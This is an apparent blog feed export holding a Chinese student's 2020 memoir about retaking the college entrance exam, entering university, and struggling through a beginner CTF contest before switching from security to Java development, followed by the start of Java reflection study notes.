<h2 id="去应对一切可能"><a href="#去应对一切可能" class="headerlink" title="去应对一切可能"></a>去应对一切可能</h2><p>快速进入学习状态的我开始了快速的复习，到了最后一个月，我已经将二轮复习完全补完了，做题能力大幅度上升，但是因为不细心却导致了很多错误，尤其是理综，有的时候甚至能错上七八到题目，比如下面图片的考试，理综就因为不细心雪崩了，我就把成绩贴到桌角来激励自己。后面开始专门刻意的去训练自己的准确度，经过了一段时间之后有了很大的好转。</p>
<p><img src="https://xorex.space/image/147.jpg"></p>
<p>其次就是空调问题，随着进入六月，天气也开始越来越热了，但是因为防疫的要求学校不给开空调。然后在一次数学考试中，因为天气炎热加上我做题不顺，一直流汗，注意力根本无法集中到考试上，心态大崩，只考了 70 多分。后面我一度很害怕，害怕高考的时候出现这样的情况，如果真的有了，那我直接完蛋。</p>
<p>后来有了一个新的同桌宝宝，和他坐一块也挺有意思。我们两个本质上是比较相似的，但是因为一些原因最后才熟悉起来。我们两个中间交流的话题挺多，而且都在周末不回家，呆在学校里面。到了周六晚上，其他同学回家，我们就呆在班里面开始我们一周一次的娱乐活动，下面就是我们用投影仪一起看辉夜大小姐的时候：</p>
<p><img src="https://xorex.space/image/148.jpg"></p>
<p>学校当时三轮复习结束之后的策略就是以考代练，让我们疯狂的写卷纸，写了好几个星期。但是写着写着感觉自己不知道学什么了，每天都在一套一套的刷卷纸，刷完总结错题，那个时候的我一度非常泄气。于是将策略开始转向了背书，尤其是生物。由于自己的记忆力真的是非常差，就提前搞了一个生物知识点的总结，写了足足一本，背了好几轮。每天中午就到实验楼四楼我专属地盘背书，非常爽。</p>
<p><img src="https://xorex.space/image/149.jpg"></p>
<h2 id="结束了高中生活"><a href="#结束了高中生活" class="headerlink" title="结束了高中生活"></a>结束了高中生活</h2><p>高考的最后倒计时，没有想想的那么紧张，感觉自己该学的都学过了，就是不断地巩固复习，做题保持手感。我也开始尝试了一些新的东西，比如早上跑步。每天早上跑完步之后真的是非常清醒，也让我爱上了这种感觉（虽说到了大学已经丢掉了） ，中午吃饭的时候也开始挑战最短时间，我还专门用手表开始计时。我记得从放学跑到餐厅，吃完午饭之后跑回回班里最短用了 7 分钟。</p>
<p>距离高考只有10天之前我感染了普通的流感病毒，成功感冒发烧，当时的我一度非常高兴，因为现在到高考的时间足够我痊愈了。这样到了高考，我就一定不会生病（对此流感病毒免疫），可以用最好的状态迎接考试了。同时考试之前我也开始在意各种身体的状态，尽可能地保证自己的考试状态。</p>
<p>最后几天我开始逃课到四楼复习，因为老师的安排就是一套一套写卷纸，实在是写吐了，就开始全面的过知识点，做最后的巩固。时间不断流逝，高考也最终来了。这是对我来说真正意义上的高考，是我真的给予了非常大的期望的考试，虽说已经考过一次了，但是却比第一次紧张多了。</p>
<p>复读生被安排到了一个单独的学校，实验小学，虽说有点担心考试场地对我的影响，但是好在其实并没有什么影响，空调凉度适中，桌椅大小合适，也就钟表看的不太舒服，到了第二场考试这个问题也被解决了。就像是换了个地方考了一次模拟一样，我的第二次高考结束了，没有任何意外，一切顺利！</p>
<h2 id="毫无压力的暑假"><a href="#毫无压力的暑假" class="headerlink" title="毫无压力的暑假"></a>毫无压力的暑假</h2><p>考完试之后，第一件事情就是买电脑了，我高考前心水了很久 小新Pro13锐龙版 在拼多多的百亿补贴上面降价到了 4199，考试结束当天下午就买了下来。至于手机我并不着急，手里的魅族X8还能使用，而且今年发布的手机没有一个令我满意的，就先没有购买手机。</p>
<p>考试结束的晚上是在睡不着，就找网上的答案对了一下，感觉还行，不好不坏的样子，算了一下分数乐观估计大概在 600 分左右，就安心去睡觉了。之后的暑假，报名了驾校，开始了代码能力恢复计划，写起了《我的高中生活》（虽然太监了）。剩下的时间就是看看动漫玩玩游戏，然后就是仔细挑选大学。</p>
<p>大概是用了两天左右的时间，将好几个分数段的学校都开始了筛选，根据我的需求，筛选出来不少学校，把他们汇总成 Microsoft Todo 里面的任务，什么分数，什么排名，对应什么学校，当时的我统计的一清二楚，只要成绩出来，就马上可以锁定一选过的院校。</p>
<p>之后就是打工生活了，林泽音小姐姐介绍了我一份比较摸鱼的工作，由于这个工作可以用来学习的时间比较多，于是我就欣然接受了。是争鸣学堂的班导工作，主要负责处理班级里面的各种杂事，比如收发作业，打印卷纸，批改听写，打扫卫生，和老师对接等等。虽说要从早上8点工作到下午7点，但是实际工作时间很短，大部分都是上课时间，我只需要坐在最后面，时不时关注一下学生们的动态，记录一下大致情况，拍一些照片即可。剩下的大把时间都可以用来学习，比如刚开始的一个星期我都用来看 CSAPP 的英文版了。</p>
<p>到了 26 号，就是公布高考成绩的时候了，说不紧张那是假的，我比去年紧张多了。去年我还能安心睡觉，等到人少的时候再起床查成绩，今年就完全做不到了。坐在电脑面前开始刷新网页，刷到了凌晨三点左右才出来成绩。613 分，省排 3.2w ，对我来说还不错。</p>
<p>报考志愿主要在 成都信息工程大学 和 郑州大学 之间犹豫。中间经历了几次修改之后，最后为了计算机类的专业，选了成信。但是宝宝因为自己考的比较差，所以没啥心情报考志愿，我就给他解决了，冲了成都的几个学校，留了 华北水利水电大学 保底，最后保底了进了软工。</p>
<h2 id="绝不停止的学习"><a href="#绝不停止的学习" class="headerlink" title="绝不停止的学习"></a>绝不停止的学习</h2><p>结束了打工之后，理所当然的去考科目一了，毕竟已经拖了快半个月了。考科目一的时候遇到了同样来学车的初中数学老师（当时感觉没有脸面见她，毕竟复读了还是感觉丢人），中间在开始考试之前交流了一些近况之类的。科目一当时理所当然的一次就过了，虽说自己记忆力不太强，但是区区科目一还是很简单的。</p>
<p>然后就是科目二的学习，刚开始不知道去预约啥的，就在上车模拟那里花了很长的时间，导致整个科目二整整学了将近一个月。</p>
<p>后来从又林泽音小姐姐那里又搞了一个活，去 JZYZ 机房做助教，来帮助高一萌新们快速入门信息学奥赛。当然这个我当时并不知道有工资，只是单纯的想要帮学弟学妹们学习，因为自己当年在学习竞赛的时候也受到了学长们的帮助，于是就想要把这种一代帮一代的精神延续下去。</p>
<p>然后就多了一个学习的地方，也见到了帆神刘神尧神，得知刘老师从浙江回来了，认识了新来的张文军教练。中午有免费的咪小多吃，培训最后还有学妹送奶茶喝（送给Hvcime了）。最后一天我们 2019 届的 OIer 们和刘老师一起出去吃了晚饭，大家在一起畅所欲言，回忆过往的趣事，也了解了刘老师在浙江的这三年的工作，大家都很开心。总之整个打工过程真的是非常快乐啊！</p>
<p><img src="https://xorex.space/image/150.jpg"></p>
<p>后来大家的高考录取结果就都出来了，我被成信的信安专业录取，林泽音小姐姐录了郑大的管科，帆神录了哈工程的计算机，结果都还不错。虽说我没有被我最想去的软工和计科录取，但是在网上查询了成信的信安之后，发现了新世界，说是成信的三叶草安全技术小组实力非常强大（<del>脚踩川大，拳打电科</del>），而且还附上了招新群。于是一无所知的我就加入了这个招新群，跳进了一个新的大坑。</p>
<p>在这个招新群中混了几天，到了一天晚上，群里突然有人开始刷：师傅我想学web，我就也开始跟风刷了一句（当时还不知道 Web 和 二进制 两个方向是做什么的），突然一个学长就申请添加我为好友，然后大概给我说了说如何入门 web 安全，让我去看看 HTTP 协议和 HTML 相关的东西。大概过了几天之后，他把我拉到了一个 Web 的学习群里面，并利用语雀平台给我们布置了第一个任务：学会基本的 SQL 语法，并使用自己搭建的 MySQL 环境进行练习，时限大概三天左右。</p>
<p>这个任务对于我来说还好，但是对于计算机新手来说一点也不简单，我在浪爷给的练习网站里面练了不少 SQL 的语法，虽说练习的这些和安全关系不大。不过也是见到了一些超级大佬，比如即使是新手任务也能按照地狱级难度完成的 <code>FeverKing</code> 大佬。第二次的任务就有点难得离谱了（对于新手来说），直接让搭建本地服务器，然后实现 SQL-Labs 的环境，然后打通他。</p>
<p>这让我这个完全没有接触过除了竞赛以外的计算机相关来说，直接蒙了，前两天都花时间在手动搭建服务器上面了，Apache MySQL PHP 三者的联动手动配置起来真的是非常的麻烦，我对于网络这些完全一窍不通。虽说学长给了 PHPStudy 这种一键部署的工具，但是因为这个工具没有适配高分辨率屏幕，在我本来看起来就非常小的笔记本屏幕上看起来根本没有办法使用。配置了一天也没有成功的我只能放弃，开始贴着屏幕使用 PHPStudy 完成了环境的搭建。</p>
<p>后面的 SQL-Labs 的学习更加艰苦，因为根本不了解内部的原理，所以只能在网上找教程，但是教程里的每一个字我都认识，组合在一起就看不懂了。大概花了好几天，才慢慢熟悉什么是 SQL 注入，以及整个 SQL 注入的攻击流程，虽说有点延期，但是还是顺利完成了这个任务。当时和林泽音小姐姐一起呆在一中学习，我完成 Web 小组的任务，她在一旁学习高数（因为要转专业），每天大概 10 点多一起回家（有个能学习的地方和学习的伙伴真不错！）</p>
<p>就这样，在每天持续学习的过程中过完了暑假，一个很充实的暑假，接下来，就是大学生活啦！</p>
<h2 id="开始了大学生活"><a href="#开始了大学生活" class="headerlink" title="开始了大学生活"></a>开始了大学生活</h2><p>临出发去成都之前，研究了怎么买机票，登机，订酒店，购置了一些必需品，然后怀揣着对未来的期望，与凌晨三点从家里出发前往郑州机场，开车前往郑州的路程中，看到了漆黑一片的龙源湖公园门口有着唯一的灯光，那是一个小吃车，旁边有个中年妇女，在凌晨三点半的时候就已经开始了自己一天的辛劳，这个时候突然感觉自己好幸运啊，能够去读大学，去学习自己挺喜欢的计算机，然后以后能找一份体面的工作，不用这样辛劳，应该学会满足和感恩啊！</p>
<p><img src="https://xorex.space/image/151.jpg"></p>
<p>到了郑州机场时间还比较早，就在机场吃了早饭（好贵贵贵啊！）但是不知道需要提前好久去安检登机，就差点迟到了。想着以后自己坐飞机的机会还多，就把靠窗的位置给了父母，在伴随着巨大噪音的加速中，我前往了这个未来我要居住四年的城市——成都。</p>
<p>到了成都之后，和父母一起去逛了几个比较著名的景点，吃了成都的火锅（感觉一点也不辣啊），最后去超市买了各种生活必需品。其实逛了大半个成都之后感觉还是很失望的，在我的印象里面，成都应该是发展很棒的新一线大城市啊，但是大部分的城区也就十八线小城市焦作的级别，大概只有市中心（春熙路）和地铁（超方便）看着才有大城市的感觉，好在成都的物价比我想象的低，吃喝没花多少钱。</p>
<p>开学之后感觉成信的校园就是加强版本的焦作一中，四改六的寝室看着比想象的好一些，餐厅比较一般（一中餐厅永远的神！）。不过好在寝室里的同学还都不错（除了旁边打游戏用青轴开外放的那个），16 栋 5034，条件比一中的八人间好很多，有了自己的小桌子，有了独立卫生间，有了自己控制的空调。寝室里的同学们也是来自天南地北，比如来自江浙沪发达地区江苏苏州的唐震，看着像南方人实际来自东北辽宁的税奕铭，还有来自和焦作距离很近的山西长治的吕子韬，剩下两个则是四川绵阳和四川都江堰的胥宇杰和饶飞杨。</p>
<p>大学的课程也是直接给我喝了一壶，高等数学和线性代数直接变成定义朗诵课，除了C语言真的能学到知识以外（然而我已经掌握了），剩下的就全部都是大水课了。定义朗诵课的结果就是我根本听不懂，只能上课自己看书，但不讲人话的教材看的也是一头雾水。</p>
<p>后来和另外一个在 Web 学习小组的同学一起去三叶草安全实验室参观了一下，学长们都在显示器面前钻研技术，实验室的各种获奖证书叠了快有人高，最前面的是近几天刚刚拿到强网杯的全国第七，被邀请到线下决赛。三叶草的学长们也都很友好，和我们交流了一下各自的情况，还欢迎我们常来实验室玩，氛围真的是非常棒！</p>
<p><img src="https://xorex.space/image/152.jpg"></p>
<p>由于我有编程的基础，所以在寝室里面可以指点其他同学学习C语言，他们就因此以为我是大佬，纷纷给我取了源老的代称，想想我只不过是比他们多了编程的基础而已，并没有什么了不起的。</p>
<h2 id="信息安全好难啊"><a href="#信息安全好难啊" class="headerlink" title="信息安全好难啊"></a>信息安全好难啊</h2><p>过了大概半个月之后，看着这课程我就完全听讲不下去了，因为完全听不懂老师们朗诵的内容，于是就开始在课堂上各种划水。安全的知识继续跟着 Web 小组的进度学习，不过已经没有刚开始的时候那么困难了。就这样，一个月的大学生活就这样过去了。按照三叶草安全小组的传统，会有一个安全比赛——极客大挑战，来帮助成信的学生们入门信息安全，从而方便自己选拔实验室成员。这个比赛如期而至，不过需要两个人组成一个队伍，一个人解决 Web 方向的题目，另外一个人解决二进制方向的题目。就这样，我认识了在寻找队友的二进制大佬 77，和他组成了一支队伍，队伍名字为：桃李春风一杯酒。因为他想要一个有诗意的名字，所以就按照他的意思定了。77 是我们这一届中最早接触安全的人，暑假被令则带着学习了两个月，大概是当时成信 20 届二进制第一人，所以他很想拿第一名。由于我当时还没有清晰的认清楚我和其他大佬的差距，就答应他会好好打比赛，努力实现这个目标，现在想想真的是给自己挖了个大坑。（我和各位大佬都在完成 Web 小组任务，比较面向新手，自然大大限制了大佬们的上限，让我以为和大佬们都能完成小组任务就说明我能跟上大佬们的进度了）</p>
<p>然后就是去参加三叶草的宣讲会，去的人很多，场面很热闹。现场演示的各种破解也很有趣，爆破了教室摄像头，学校门禁，共享单车，CSGO游戏，QQ空间等等，酷到爆炸。很难不让人对三叶草充满了向往：“去成为一名 Hacker 吧，少年！” 宣讲会结束之后就是一面，拿到了两个最高的 P 评价，剩下的就是等待明天开始的极客大挑战了。</p>
<p>于是，接下来的两个月，我的漫长的噩梦开始了。</p>
<p>在此之前，因为周围人大多都没有计算机相关的基础，所以刚开始我的自我感觉还算良好。无论是为数不多的坚持下来跟着 Web 小组的进度学习，还是在零基础同学们面前的 “大佬风范” ，都让我感觉自己学习能力还可以，但这不过是因为大家都是零基础造成的假象罢了，不过是没有站在同一起跑线上的比赛。</p>
<p>极客大挑战开始的当天，我和 77 一起去图书馆解题。早上 9 点，第一波题目被放了出来，我负责的 Web 一共有五道。一个小时之后，我顺利的把五道的三道解决了，都是比较简单的题目，跟着提示就可以完成了。剩下的两道中，有一道是卡在了不知道去哪里找 Flag，另外一道是完全不知道思路。</p>
<p>剩下的时间就是不停的在看这两道题目，在网上搜索相关的内容，想办法找到这些题目的思路。然而过了一上午也想不出来，当然想不出来了，这可是第一次做 CTF 的萌新，怎么可能想出来呢。这个时候旁边的 77 已经把除了 pwn 以外的其他所有题目都解决了，我们队伍的排名也上升到了前列。吃完中午饭之后，77 开始学习 pwn 的知识，而我继续搜索这两道题目的相关内容。这真的是一个非常痛苦的过程，因为完全什么都不知道，只能生硬的在网上漫无目的的搜索，而且这个搜索已经进行了三个小时了，我都想放弃了，但是旁边的队友很兴奋，时不时刷新着排行榜。我只能硬着头皮继续在互联网上毫无方向的搜索着，看着各种专业名词的文章，想办法找出和题目相似的地方。</p>
<p>这个时候 77 已经完成了除了 Web 方向的所有题目，在旁边给我加油。然而我已经一无所获 5 个小时了，处于接近崩溃的边缘，满脑子想着，我为什么要和他组队呢，这实力差距好大啊，自己这么菜肯定回让他失望了吧！好在这个时候一道 Web 的题目放出了提示：Do you know CSRF ? 我赶快去搜索了这个名词，好像这就是这道题目的题型。</p>
<p>花了半个小时大概明白了什么是 CSRF，然后开始摸索如何解决题目，经过漫长的思考和各种尝试，大概摸索出来了一条道路，花了 4 个小时解决了它。拿到 Flag 的那种释然简直爽到爆炸。但是第一题 Welcome 怎么都不知道去哪里获取 Flag，一天过去了也没有解决。这道题目更加让人崩溃，我已经将 PHP 配置文件看了数十遍，一点思路都没有（因为是萌新，当然没有思路了），最后是十几天之后，77 从其他人那里问到的方法，才找到 Flag 在哪里。</p>
<p>后面的题目就更加难的离谱了，为了不辜负 77 的期待，不拖他的后腿，开始了和 77 一样每天晚上熬夜，白天上课补觉，睡醒了继续做题的打工生活。但还是太难了，对于我来所，这些根本没有见过的题目根本没有办法凭空想出来思路。绝大部分都是在毫无进展的情况下，看着没有回显的页面发呆，然后不停的绝望和怀疑人生。最可怕的是我不能停下脚步，我不能放弃，因为我还有队友 77 ，他实力那么强大，他想要个好排名，我也要和他一起努力才行。</p>
<p>但着毕竟是努力无法解决的，不会就是不会，想不出来就是想不出来。再多的努力也是徒劳的，只会把耐心一点点消磨殆尽，然后陷入绝望。每天吃饭难以下咽，睡觉都在想着题目如何解决，但太无力，留给自己的只有无尽的绝望。于是我开始尝试逃避 77 ，逃避他期待的眼神，开始尝试停下毫无进展的解题过程，开始第一次早早上床睡觉，但是满脑子仍然亲不自禁的想着题目。然后在有一天，将这些告诉了他。</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">感谢你啊</span><br><span class="line"></span><br><span class="line">说实话，前几天真的是有些自闭了，可能是学习的方法不对，也有可能给自己的压力有点大了（本质还是我菜）</span><br><span class="line"></span><br><span class="line">那时候我觉得我很后悔和你组队，你二进制那么厉害，除了re，pwn，还做完了杂项和密码学，我连自己的web都搞不定，我基本全程拖后腿。</span><br><span class="line"></span><br><span class="line">看着 fever_king 每天熬夜肝题，一道接一道，最后 AK，感受到了实力差距的绝望。</span><br><span class="line"></span><br><span class="line">暑假的时候学了几种语言打了几个靶场就以为自己比其他新生厉害很多，极客大挑战应该问题不大，现在看来问题大了</span><br><span class="line"></span><br><span class="line">即使和我一样同时学习安全的 f1ve 都能坚持下去肝题，一直忘不了他给我发好友申请时候的备注：喜欢web </span><br><span class="line"></span><br><span class="line">看着一道题目，有时候都不知道要干什么，去查各种资料还是不知道如何解题。</span><br><span class="line"></span><br><span class="line">但是有时候这道题设置的waf是什么都不清楚，看着空白的回显页面发呆，就这样毫无进展的几个小时过去了。</span><br><span class="line"></span><br><span class="line">安全是什么都不懂就入了web的坑，跟着小组做了几次任务就觉得自己水平还可以，太Native了。</span><br><span class="line"></span><br><span class="line">真正开始比赛之后就露馅了，我还是菜鸡一个，就像一个小学生做高考压轴题，要干什么都不知道。</span><br><span class="line"></span><br><span class="line">想要放弃但是不能放弃，这不是单人赛，我放弃了你怎么办。</span><br><span class="line"></span><br><span class="line">开始不想碰那些毫无头绪的题目，开始想要躲避你的期待。</span><br><span class="line"></span><br><span class="line">想要躺平，但是每天一闭眼都会情不自禁的想 web 题目，一整夜都睡不好，吃不进东西。</span><br><span class="line"></span><br><span class="line">如果当初方向没选web，没去了解三叶草，没报全省只招2个计科的成信，就不会变成这样的情况吧。</span><br><span class="line"></span><br><span class="line">但这些都已经成为定局了，必须去面对问题，解决问题，逃避只会让它越来越糟糕。</span><br><span class="line"></span><br><span class="line">所以才会问你，你喜欢安全吗，所以才会告诉你这些内容。</span><br><span class="line"></span><br><span class="line">我实话说，我骗不了自己，至少现在没有办法欺骗自己，比起找漏洞做安全，我更想成为软件工程师。</span><br><span class="line"></span><br><span class="line">我觉得创造一样东西的时候，其本身就是一个很值得享受的过程。</span><br><span class="line"></span><br><span class="line">我很羡慕 fever_king 整夜不睡肝题目，羡慕他能说出来：虽然有点累但是做喜欢的事情就很快乐。</span><br><span class="line"></span><br><span class="line">就像我高考完去学 Python 做小游戏的时候，肝到凌晨四点但是很快乐（除了修bug不快乐）</span><br><span class="line"></span><br><span class="line">我没什么天赋，没什么毅力，只是觉得计算机挺有意思，学习它很快乐。</span><br><span class="line"></span><br><span class="line">未来要走什么路：安全/开发，或者两者一起；</span><br><span class="line"></span><br><span class="line">这些我还不太确定，但是唯一确定的是：</span><br><span class="line"></span><br><span class="line">我会继续坚持下去极客大挑战，会去学习更多的知识，尽可能的解决更多的题目，和你一起完成比赛。</span><br><span class="line"></span><br><span class="line">但可能还是会很大程度的拖你的后腿，这里向你说声抱歉了。</span><br></pre></td></tr></table></figure>
<p>所有话说出来之后，得到了他的理解，两个人也进行了非常坦诚的交流，这件问题也终于让我得到了一些释怀。但极客大挑战仍在继续，我还是需要去尝试解决这些问题，总的来说还是需要去面对绝望，但是压力没有那么大了。极客刚开始的第一周的压力是很难描述清楚的，没有经历过的人是很难感同身受的，以我的单薄的语言描述是根本无法体现的。他人的期待，题目难度的绝望，进退两难。可以很确定的说，那是我目前人生中最绝望的时刻，没有之一。</p>
<h2 id="绝望被大佬乱杀"><a href="#绝望被大佬乱杀" class="headerlink" title="绝望被大佬乱杀"></a>绝望被大佬乱杀</h2><p>随着极客大挑战的进行，三叶草的二面开始了。二面的 Web 有三个方向，第一个是代码审计一个购物网站，要求多个漏洞组合利用实现任意文件读取。第二个是两道 CTF 题目，第一道 SSTI，第二道 SQL 注入。第三个是拿 Src，直接过面试。由于被极客的 CTF 题目给狠狠暴打了一顿，所以我理所当然的选择了第一个任务，看了好几天的 PHP 代码，然而除了一个反向加钱的，一个有用的漏洞都没找到。</p>
<p>还有一件事情就是在上思修课的的时候，在抽屉里捡到了一台 iPad，然后在万能墙上发布了出去。第二天 zwh 找我说是他的 iPad 丢了，事情非常巧。可能是因为帮他找到了 iPad，他在报名 Connected Junction 黑客马拉松的时候，拉我组了一队，一起抱着无名神的大腿，前往了天府新区。</p>
<p>在这个比赛我全程都在做三叶草二面的第二个任务，其他都基本上是 zwh 和无名神在做。这次和新生实力比较强劲的小伙伴们接触了不少，最大的感觉就是难以融入他们。可能是觉得自己和他们的技术水平差距太大了吧，自己也不太愿意融入他们。比赛最后我们队非常意外的拿到了最具潜力奖，8000 块的奖金，我全程只做了一些数据处理，差不多算是白嫖了 1600 块。</p>
<p><img src="https://xorex.space/image/153.jpg"></p>
<p>比赛回来之后的生活就比较随意了，极客没怎么打，学了一些更广泛的东西。这个时候我的室友们正在完成道格实验室的二面任务，他们的学习进度飞快，把我吓了一大跳，甚至比我当时学习的速度还要快很多。于是不得不承认了自己学习能力并不出众的事实。各种因素结合起来并认真思考之后，我决定更换学习方向，从安全转为开发，成为一名码农搬砖工。</p>
<p>于是三叶草的三面任务我就完全放弃了，除了极客的影响以外，还有 Junction 的，大一参赛的基本都是三叶草候选人员，接触这几天感觉自己实力差距大到难以融入他们，我很害怕加入三叶草之后我的现状会延续下去，无论是并不喜欢安全，还是难以融入集体。最终决定放弃了加入三叶草，并和一直帮助我的浪浪学长讲了讲我转开发的事情，得到了他的鼓励。退圈安全之后把目光放到了一个开发实验室，IOTU 上面。其实开发实验室还有一个更好的选择——易控实验室，但是一是我错过了易控实验室的宣讲会，二是被室友和极客大挑战给弄的觉得自己很菜，单独面试也不太好，三是我迫切想要加入实验室用来学习，于是就去了比较好进入的 IOTU。</p>
<p>这一个多月我过的是非常痛苦的，简直是我人生低得不能再低的低谷了，每天都很失落，基本上就靠着单曲循环 Hiiro 的 潮汐，来改善一下自己失落的心情，这首歌真的是给了我很大的帮助去熬过那段时间。</p>
<p><img src="https://xorex.space/image/154.jpeg"></p>
<h2 id="迷茫的失去梦想"><a href="#迷茫的失去梦想" class="headerlink" title="迷茫的失去梦想"></a>迷茫的失去梦想</h2><p>接下来就是准备 IOTU 的各种考核任务，主要是深入学习了 C 语言，然后剩下的时间全部用来颓废了。可能是学习安全被打击的太狠了，之后的一个月我都没怎么好好学过技术了，在寝室里看了不少电影和动画。除了颓废看动画，为了拯救接近禁考的线性代数（因为极客前后一个半月没听过课了），也认真学了学它，真正感受到了线性代数的魅力，也更加坚定了以后不跟着老师，全部自学的决心。</p>
<p>虽说远远离开了三叶草和信息安全，也能稳稳的加入 IOTU，但之后的时间仍然处于一个比较低沉的状态。来到成信之后，我已经很久没有感受到快乐了，甚至用来治愈自己的好天气都没有。（垃圾成都天气，我毕业一定跑路！）对于放弃加入三叶草，内心还是有点可惜的，因为这毕竟是一个强的离谱的平台，拥有全成信最棒的资源，未来出路也都是 BAT 级别的大厂，自己在信安专业学习软件工程的内容，出路肯定回差不少。</p>
<p>再后来因为辅导员的管理松懈，我的逃课也越来越熟练了起来。对于即将到来的四级考试，我的内心也毫无波动，甚至因为题目过于困难想要去逃避它。感觉自己已经变成了一条挂在商店的咸鱼，完全接受了自己垃圾的现实，然后开始自暴自弃。中途想过要转专业去软工的，但是和班导交流过后，权衡了利弊放弃了转专业，现在想想的确是一个比较正确的决定，如果转专业去了软工，就没人上课帮我喊到来逃课了，作业完成和考试信息获取也会麻烦不少。</p>
<p>那段时间的每一天我都感觉不到我正在活着，仿佛自己就想一具行尸走肉一般。每天早上醒了之后，能逃课就逃了呆在寝室里，不能逃就去上课玩手机，然后是吃饭和看动画，最后一天结束之后躺床上睡觉。每天都是这样过下去的，很迷茫，很痛苦，很无助。</p>
<h2 id="没前途的打工人"><a href="#没前途的打工人" class="headerlink" title="没前途的打工人"></a>没前途的打工人</h2><p>不过好在很快就通过了 IOTU 实验室的选拔，并且拥有了自己的位置用来学习，实验室是和道格在一间教室里面的，实验室经过装修之后，两者没有隔开了。我最开始选择了第一排靠近讲桌的位置，并在双 12 在京东上购买了一台攀升的28 英寸 4k 显示器，不过由于多种原因：拓展坞的 hdmi 接口最大支持 4k30hz，显示器颜色过于偏黄，尺寸过大看着费力。在京东上又退掉换了一个 sanc 的 23.8 英寸 2k 显示器，无奈因为便宜货的背光太差，屏幕油腻感很严重，于是又退掉了（京东别拉黑我啊！）</p>
<p> 然后就是从零开始学起了高数，毕竟总不能等到快考试再去学吧，到时候可能就有点晚了。不得不说蜂考的课程是真的棒，用来快速入门高数真的是太爽了。有了一个学习的位置自然就要学习计算机了，我开发选择的方向是 Java 后端开发，因为觉得前端需要按照设计师给的图写代码，现在各个公司的 app 设计的都和 <code>*</code> 一样，让我写 <code>*</code> 一样的代码我肯定不太想做，还是去做后端的数据处理吧！</p>
<p>于是大概就一直学习起来了 Java ，学了很多面对对象的东西，不得不说 Java 的确很适合用来处理业务逻辑。不过因为是和道格在一间教室，所以经常能听到他们在讨论关于安全比赛的事情。比如全国各地到处旅游打比赛啦，大把大把的拿比赛奖金啦，去哪个大公司实习啦。真的让人非常羡慕啊，在成信最好的出路就是学习安全了吧，但是自己已经放弃了，放弃了一个更好的机会，以后要搞内卷严重的开发了，去当一名搬砖打工人。</p>
<p>同时也很羡慕在打 ACM 的林泽音小姐姐，她也志向将来读研，搞人工智能，以后也应该稳去大厂吧。花了一小段时间才接受自己将来要出苦力赚钱的现实（可能是在学习安全的时候，三叶草给自己对未来的憧憬拉的高度太高了吧，毕竟是人均 20k 的实验室），自己果然就是一条咸鱼啊。</p>
<h2 id="我的未来在何方"><a href="#我的未来在何方" class="headerlink" title="我的未来在何方"></a>我的未来在何方</h2><p>2020年的最后就要进入考试密集区了，已经考了两门，线性代数和大学计算机基础，大计基是靠着老师画的重点速成的，线性代数是自己真正认真研究学会的。想想果然在大学老师真的教不了什么真正给自己，当初报考志愿的时候还是太在意专业了（应该忽略专业去杭州师范的！），果然学习还是靠自己啊。</p>
<p>自己也想清楚了以后要做什么了，虽说这个过程有点坎坷，但是好在最终还是走上了正轨，走上了当初自己所期待的样子。不过对于未来的迷茫和不确定性仍然感到有点恐惧，2020 好好的给我上了一课，希望 2021 能温柔一点啊！</p>
<p>冲啊！要成为一名优秀的软件工程师啊！</p>
]]></content>
      <categories>
        <category>阶段性总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>感想</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反射学习笔记</title>
    <url>/2020/12/28/1dd949f5ac1b/</url>
    <content><![CDATA[<h2 id="Class-类"><a href="#Class-类" class="headerlink" title="Class 类"></a>Class 类</h2><h3 id="JVM中保存类的Class"><a href="#JVM中保存类的Class" class="headerlink" title="JVM中保存类的Class"></a>JVM中保存类的Class</h3><p>在理解反射这个概念之前，我们要先理解一下 Class，Class 是一个 Java 自己带的类，注意这里的 Class 首字母是大写的，说明它是一个类的名字，而不是 类 的英文翻译，就像我们自己定义的一个类一样：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Xorex</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这叫作 Class 的类（这个名字容易误解成这个叫类的类，但实际上 Class 只是它的名字），也有自己的定义，虽然有点长：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Class</span>&lt;<span class="title">T</span>&gt; <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span>,</span></span><br><span class="line"><span class="class">                              <span class="title">GenericDeclaration</span>,</span></span><br><span class="line"><span class="class">                              <span class="title">Type</span>,</span></span><br><span class="line"><span class="class">                              <span class="title">AnnotatedElement</span>,</span></span><br><span class="line"><span class="class">                              <span class="title">TypeDescriptor</span>.<span class="title">OfField</span>&lt;<span class="title">Class</span>&lt;?&gt;&gt;,</span></span><br><span class="line"><span class="class">                              <span class="title">Constable</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">                              &#125;</span><br></pre></td></tr></table></figure>
<p>那么这个叫作 Class 类有什么用呢？答案是用来保存其他的类。</p>
<p>在 JVM 运行的时候，它一边运行，一边会把自己需要执行的类放入自己的内存中，叫作<strong>动态加载</strong> （不会一次性全部加载，而是需要的时候再去找），比如一个程序我们需要 <code>Xorex</code> 和 <code>Tempest</code> 两个类并在程序中创建 N 个它们的实例。那么 JVM 运行的时候，会在第一次实例化的时候，查看自己的内存中有没有这个类的信息，如果内存中没有这个类，那么就会把这个类加载到自己的内存中，然后根据内存中的这个类的信息，创建一个实例（开辟一块内存空间存放这个实例的数据。），内存中有了这个类的信息之后，第二次创建实例就简单多了，只需要再开辟一块内存空间存放这个类的数据就算实例化了（实例是类的数据）。</p>
<p>那么我们放在内存中的类，是以什么形式的保存的呢？没错，就是用 Class 类的实例来保存，每一个保存在内存中的类，都是 Class 类的一个实例！这个类的所有信息都被保存在 Class 类的实例中。</p>
<h3 id="反射的概念"><a href="#反射的概念" class="headerlink" title="反射的概念"></a>反射的概念</h3><p>这里我们就可以引入反射的概念了，反射 Reflection ，就是利用一些能确定某个类的信息，映射出这个类，然后反射出整个类的所有结构。这个确定某个类的信息需要有确定性，比如某个类的完整名称（方法三），某个类的实例（方法二），或者某个类的 Class 包含的所有信息（方法一），只要有这些确定性信息就能映射到一个确定的类身上，然后反射出来整个类的所有信息。</p>
